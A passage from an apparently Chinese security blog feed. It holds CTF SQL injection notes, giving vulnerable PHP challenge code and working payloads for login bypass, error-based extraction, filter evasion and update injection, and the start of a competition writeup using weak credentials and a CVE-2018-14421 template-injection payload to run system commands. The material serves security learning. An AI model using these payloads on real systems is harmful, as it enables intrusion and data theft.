$_POST[&#39;pwd&#39;]</code>，后者使用<code>group by pwd with rollup</code>在查询结果中加上一行，且pwd字段的值为NULL,以此绕过<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>过滤,则使用<code>limit # offset #</code>来满足<code>mysql_num_rows($query) == 1</code>,fuzz出<code>limit 1 offset 2</code></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #</div></pre></td></tr></table></figure><p>test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">MariaDB [test]&gt; select text from article group by NULL with rollup limit 1 offset 2 ;</div><div class="line">Empty set (0.00 sec)</div><div class="line"></div><div class="line">MariaDB [test]&gt; select * from article;</div><div class="line">+---------+-----------------------------------------------------+</div><div class="line">| id      | text                                                |</div><div class="line">+---------+-----------------------------------------------------+</div><div class="line">| 1       | guess what?                                         |</div><div class="line">| 3       | you can test it with sqli                           |</div><div class="line">| 2       | dudulu                                              |</div><div class="line">| 4       | The choice of the stone gate of all dead destinies! |</div><div class="line">| 5       | ??? ???                                             |</div><div class="line">| 8848    | you want by a phone?                                |</div><div class="line">| 9588    | you will be lucky                                   |</div><div class="line">| 1245123 | flag&#123;37316894c36cb32d2ca3f7d3add88024&#125;              |</div><div class="line">+---------+-----------------------------------------------------+</div><div class="line">8 rows in set (0.00 sec)</div></pre></td></tr></table></figure><h2 id="0x12-注出可控数据绕过登录"><a href="#0x12-注出可控数据绕过登录" class="headerlink" title="0x12 注出可控数据绕过登录"></a>0x12 注出可控数据绕过登录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">welcome to simplexue</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    $conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</div><div class="line">    mysql_select_db(<span class="string">"phpformysql"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</div><div class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</div><div class="line">&#125; </div><div class="line">$user = $_POST[user];</div><div class="line">$pass = md5($_POST[pass]);</div><div class="line"></div><div class="line">$sql = <span class="string">"select pw from php where user='$user'"</span>;</div><div class="line">$query = mysql_query($sql);</div><div class="line"><span class="keyword">if</span> (!$query) &#123;</div><div class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line"><span class="comment">//echo $row["pw"];</span></div><div class="line">  </div><div class="line">  <span class="keyword">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</div><div class="line">    </div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;form method=post action=index.php&gt;</div><div class="line">&lt;input type=text name=user value=<span class="string">"Username"</span>&gt;</div><div class="line">&lt;input type=password name=pass value=<span class="string">"Password"</span>&gt;</div><div class="line">&lt;input type=submit&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;a href=<span class="string">"index.txt"</span>&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p>利用user处的注入返回想要的pw</p><p>例如 <code>qwe，76d80224611fc919a5d54f0ff9fba446</code></p><p>username值<code>&#39; union select &#39;76d80224611fc919a5d54f0ff9fba446&#39;#</code></p><p>password值<code>qwe</code></p><p>提交获得flag</p><h2 id="0x13-htmlentities实体化单引号情况"><a href="#0x13-htmlentities实体化单引号情况" class="headerlink" title="0x13 htmlentities实体化单引号情况"></a>0x13 htmlentities实体化单引号情况</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#GOAL: get password from admin;</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</div><div class="line">        $str=stripslashes($str);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</div><div class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</div><div class="line"></div><div class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</div><div class="line">$result=mysql_query($query);</div><div class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$row = mysql_fetch_assoc($result);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"Hello "</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Your password is:"</span>.$row[<span class="string">'pass'</span>].<span class="string">"&lt;/br&gt;"</span>;</div></pre></td></tr></table></figure><p>htmlentities将单引号实体化了，所以可用\来将源单引号转义</p><p>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1=1 limit 2,3#&apos;;</div></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?username=\&amp;password=%20or%201=1%20limit%202,3%23</div></pre></td></tr></table></figure></p><h2 id="0x14-报错注入-amp-amp-00000select-amp-amp-‘-gt-x27"><a href="#0x14-报错注入-amp-amp-00000select-amp-amp-‘-gt-x27" class="headerlink" title="0x14 报错注入 &amp;&amp; /!00000select/ &amp;&amp; ‘-&gt;\x27"></a>0x14 报错注入 &amp;&amp; /<em>!00000select</em>/ &amp;&amp; ‘-&gt;\x27</h2><p>示例题目属于二次注入，在删除功能处进行注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</div><div class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key)&#123;</div><div class="line">    <span class="keyword">foreach</span>($$key <span class="keyword">as</span> $k =&gt; $v)&#123;</div><div class="line">        <span class="keyword">if</span>(is_array($v))&#123;</div><div class="line">            errorBox(<span class="string">"hello,sangebaimao!"</span>);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $k[<span class="number">0</span>] !=<span class="string">'_'</span>?$$k = addslashes($v):$$k = <span class="string">""</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span>&#123;</div><div class="line">    $rstr = <span class="string">""</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</div><div class="line">        <span class="keyword">if</span>(ord($str[$i])&gt;<span class="number">31</span> &amp;&amp; ord($str[$i])&lt;<span class="number">127</span>)&#123;</div><div class="line">            $rstr = $rstr.$str[$i];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $rstr = str_replace(<span class="string">'\''</span>,<span class="string">''</span>,$rstr);</div><div class="line">    <span class="keyword">return</span> $rstr;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($message))&#123;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\b(select|insert|update|delete)\b/i"</span>,$message))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(filter($message) !== $message)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</div><div class="line">    &#125;</div><div class="line">    $sql=<span class="string">"insert guestbook(`message`) value('$message');"</span>;</div><div class="line">    mysql_query($sql);</div><div class="line">    $sql = <span class="string">"select * from guestbook order by id limit 0,5;"</span>;</div><div class="line">    $result = mysql_query($sql);</div><div class="line">    <span class="keyword">if</span>($result)&#123;</div><div class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</div><div class="line">            $id = $row[<span class="string">'id'</span>];</div><div class="line">            $message = $row[<span class="string">'message'</span>];</div><div class="line">            <span class="keyword">echo</span> <span class="string">"|$id|=&gt;|$message|&lt;br/&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $message = stripcslashes($message);</div><div class="line">    $sql = <span class="string">"delete from guestbook where id=$id or message ='$message';"</span>;</div><div class="line">    <span class="keyword">if</span>(!mysql_query($sql))&#123;</div><div class="line">    </div><div class="line">    <span class="comment">//print(mysql_error());依据这句话看出可以使用报错注入</span></div><div class="line">    </div><div class="line">        <span class="keyword">print</span>(mysql_error());</div><div class="line">        $sql = <span class="string">"delete from guestbook where id=$id"</span>;</div><div class="line">        mysql_query($sql);</div><div class="line">    &#125;;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>sqli关键:需要绕过单引号和preg_match</p><p>因为stripcslashes函数，可以使用<code>1\x27</code>创造单引号</p><p><code>/*!00000select*/</code>绕过preg_match</p><blockquote><p>在mysql,00000这5位代表版本号，表示只有在大于该版本的mysql中不作为注释</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">MariaDB [test]&gt;  /*!00000select &apos;zeroyu&apos;*/;</div><div class="line">+--------+</div><div class="line">| zeroyu |</div><div class="line">+--------+</div><div class="line">| zeroyu |</div><div class="line">+--------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>注： <code>concat(0x27,(/*!00000select version()*/))</code>这个对于UpdateXML和ExtractValue而言会最先执行，但是它不是一个合格xml表达式，因而或造成报错。但要注意这两个报错的最大长度是32</p><h3 id="1-利用updatexml报错"><a href="#1-利用updatexml报错" class="headerlink" title="1.利用updatexml报错"></a>1.利用updatexml报错</h3><blockquote><p>UpdateXML(xml_target, xpath_expr, new_xml)<br>updatexml函数有三个参数，作用是xml替换，把xml_target中被xpath_expr匹配到的部分使用new_xml替换</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?message=1\x27 and updatexml(0,concat(0x27,(/*!00000select version()*/)),0)%23</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MariaDB [(none)]&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~10.1.36-MariaDB~&apos;</div></pre></td></tr></table></figure><h3 id="2-利用ExtractValue-报错"><a href="#2-利用ExtractValue-报错" class="headerlink" title="2.利用ExtractValue()报错"></a>2.利用ExtractValue()报错</h3><blockquote><p>ExtractValue(xml_frag, xpath_expr) 得到xml_frag中被xpath_expr匹配到的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?message=1\x27 and ExtractValue(0,concat(0x27,(/*!00000select version()*/)))%23;</div></pre></td></tr></table></figure><h3 id="3-name-const"><a href="#3-name-const" class="headerlink" title="3.name_const()"></a>3.name_const()</h3><blockquote><p>name_const(name,value)<br>返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。</p></blockquote><p>本题利用的是表的字段名(列名)不允许重复，列名重复会报错，报错长度没有限制</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?message=aaa\x27%20and%20(/*!00000SELECT*/ * FROM(/*!00000SELECT*/(name_const(version(),1)),name_const(version(),1))a)%23</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">MariaDB [test]&gt; select name_const(&apos;l&apos;,&apos;f&apos;);</div><div class="line">+------+</div><div class="line">| l    |</div><div class="line">+------+</div><div class="line">| f    |</div><div class="line">+------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//此处的a是列别名，别名使用时是可以省略as的</div><div class="line">MariaDB [test]&gt; /*!00000SELECT*/(name_const(version(),1)),name_const(1,version())a;</div><div class="line">+-----------------+-----------------+</div><div class="line">| 10.1.30-MariaDB | a               |</div><div class="line">+-----------------+-----------------+</div><div class="line">|               1 | 10.1.30-MariaDB |</div><div class="line">+-----------------+-----------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><h3 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h3><p>前提: mysql=&lt;5.5.53时才可以使用，不然不会有返回结果的</p><p>比如我在5.6.x下进行测试就没有返回结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MariaDB [(none)]&gt; select exp(~(select*from(select user())x));</div><div class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select #)))&apos;</div></pre></td></tr></table></figure><p>如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的。</p><p>通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?message=aaa\x27 and (/*!00000select exp(~(/*!00000select*/ * from (/*!00000select*/ version())a)))%23</div></pre></td></tr></table></figure><p>参考:<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="external">https://www.cnblogs.com/lcamry/articles/5509124.html</a></p><h3 id="5-主键重复"><a href="#5-主键重复" class="headerlink" title="5.主键重复"></a>5.主键重复</h3><p>concat+rand()+group_by()导致主键重复</p><p>。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MariaDB [test]&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</div><div class="line">ERROR 1062 (23000): Duplicate entry &apos;10.1.36-MariaDB1&apos; for key &apos;group_key&apos;</div></pre></td></tr></table></figure></p><p>floor(rand(0)<em>2)则会固定得到011011…的序列,在查询时floor(rand(0)</em>2)会被计算5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。</p><h3 id="6-几何函数"><a href="#6-几何函数" class="headerlink" title="6.几何函数"></a>6.几何函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</div></pre></td></tr></table></figure><p>这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行。</p><h3 id="7-join报错爆字段"><a href="#7-join报错爆字段" class="headerlink" title="7.join报错爆字段"></a>7.join报错爆字段</h3><p>注：该方法在知道表名的情况下使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select * from (select * from 表名 a join 表名 b) c)  </div><div class="line">在得到一个字段后，使用using得到下一个字段</div><div class="line">select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c</div></pre></td></tr></table></figure><h2 id="0x15-MySQL快速盲注小技巧"><a href="#0x15-MySQL快速盲注小技巧" class="headerlink" title="0x15 MySQL快速盲注小技巧"></a>0x15 MySQL快速盲注小技巧</h2><p>将字符串经过hex编码之后，再转成10进制数字，通过盲注获取具体的数字，然后再将它还原回去。</p><p>注意当数字过长是可以采用截取字符串的方式，八位八位的获取数据结果，公式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</div></pre></td></tr></table></figure><p>参考：<a href="http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/" target="_blank" rel="external">http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/</a></p><h2 id="0x16-update注入"><a href="#0x16-update注入" class="headerlink" title="0x16 update注入"></a>0x16 update注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</div><div class="line">mysqli_select_db($link, <span class="string">'code'</span>);</div><div class="line"></div><div class="line">$table = addslashes($_GET[<span class="string">'table'</span>]);</div><div class="line">$sql = <span class="string">"UPDATE `&#123;$table&#125;` </span></div><div class="line">        SET `username`='admin'</div><div class="line">        WHERE id=1";</div><div class="line"><span class="keyword">if</span>(!mysqli_query($link, $sql)) &#123;</div><div class="line">    <span class="keyword">echo</span>(mysqli_error($link));</div><div class="line">&#125;</div><div class="line">mysqli_close($link);</div></pre></td></tr></table></figure><p>关键点:</p><ol><li>update注入，且sql语句没有写在一行代码里面 =&gt; left join</li><li>addslashes在单引号和双引号前加”\” =&gt; 出现单引号的地方用char函数代替</li><li>闭合`</li><li>除了table表以外不知道数据库的其他表了，或者根本就只有一个表，所以我就要用mysql的虚表dual</li></ol><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?table=test` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select version()),0x7e)))) tt on tt.user=`t.username</div></pre></td></tr></table></figure><p>参考：<a href="https://paper.seebug.org/216/" target="_blank" rel="external">https://paper.seebug.org/216/</a></p><h2 id="0x17-00截断"><a href="#0x17-00截断" class="headerlink" title="0x17 %00截断"></a>0x17 %00截断</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$db  = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'web_brave'</span>,<span class="string">''</span>,<span class="string">'web_brave'</span>);</div><div class="line"></div><div class="line">$id  = @$_GET[<span class="string">'id'</span>];</div><div class="line">$key = $db-&gt;real_escape_string(@$_GET[<span class="string">'key'</span>]);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\s|[\(\)\'"\/\\=&amp;\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i'</span>, $id))</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Attack Detected. Try harder: '</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]); <span class="comment">// attack detected</span></div><div class="line"></div><div class="line">$query = <span class="string">"SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '"</span>.$key.<span class="string">"'"</span>;</div><div class="line">$q = $db-&gt;query($query);</div><div class="line"></div><div class="line"><span class="keyword">if</span>($q-&gt;num_rows) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h3&gt;Users:&lt;/h3&gt;&lt;ul&gt;'</span>;</div><div class="line">    <span class="keyword">while</span>($row = $q-&gt;fetch_array()) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;li&gt;'</span>.$row[<span class="string">'name'</span>].<span class="string">'&lt;/li&gt;'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/ul&gt;'</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;    </div><div class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h3&gt;Nop.&lt;/h3&gt;'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>过滤了好多但是”`”没有过滤，使用%00截断进行截断</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=`id`;%00</div></pre></td></tr></table></figure><h2 id="0x18-绕正则"><a href="#0x18-绕正则" class="headerlink" title="0x18 绕正则"></a>0x18 绕正则</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sql = <span class="string">"select * from xxx where id = '&#123;$_GET['id']&#125;'"</span>;</div><div class="line"><span class="keyword">echo</span> $sql;</div><div class="line">$result = sql_query($_GET[<span class="string">'id'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>这个题目绕正则没什么意思，主要是想再提一下<code>$_REQUEST</code>变量覆盖问题</p><p>数据加载的顺序:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Environment-&gt;Get-&gt;Post-&gt;Cookie-&gt;Server</div></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET传参</div><div class="line">?id=1&apos; union select * from flag %23</div><div class="line">同时POST传参</div><div class="line">id=1</div></pre></td></tr></table></figure><h2 id="00-参考文章"><a href="#00-参考文章" class="headerlink" title="00.参考文章"></a>00.参考文章</h2><p><a href="https://www.cnblogs.com/REscan/p/7043705.html" target="_blank" rel="external">ctf中sql注入下的一些小技巧</a></p><p><a href="https://xz.aliyun.com/t/253#toc-0" target="_blank" rel="external">MYSQL报错注入的一点总结</a></p><p><a href="https://klionsec.github.io/2016/05/13/mysql-error-injection/" target="_blank" rel="external">sql注入入门 之 mysql 显错注入 [ floor()显错 ]</a></p><p><a href="http://www.zhutougg.com/2017/01/16/mysqlshu-ju-ku-de-12chong-bao-cuo-zhu-ru/" target="_blank" rel="external">MySQL数据库的12种爆错注入</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>湖南省第二届大学生网络安全技能竞赛初赛实践重赛-Web</title>
      <link href="/2018/11/23/2018-The-Second-HNCyber-Web-writeup/"/>
      <url>/2018/11/23/2018-The-Second-HNCyber-Web-writeup/</url>
      <content type="html"><![CDATA[<h2 id="0x01-code-audit"><a href="#0x01-code-audit" class="headerlink" title="0x01 code audit"></a>0x01 code audit</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>101.71.29.5:10039</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析:"></a>题目分析:</h3><p>有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">admin</div><div class="line">admin123</div></pre></td></tr></table></figure><p>Backup有提示源码文件和flag文件在服务器上的位置</p><p>审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">zeroyu</div><div class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][zeroyu]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][cool]);die();//&#125;&#123;end if&#125;</div></pre></td></tr></table></figure><p>注意一点这个id的值是要看响应包的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://101.71.29.5:10039//web/index.php?r=content%2Fshow&amp;id=8&amp;zeroyu=system&amp;cool=cat%20/tmp/flag</div></pre></td></tr></table></figure></p><p>最后读取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;65bb1dd503d2a682b47fde40571598f4&#125;</div></pre></td></tr></table></figure></p><h3 id="参考"><a href="#参考" 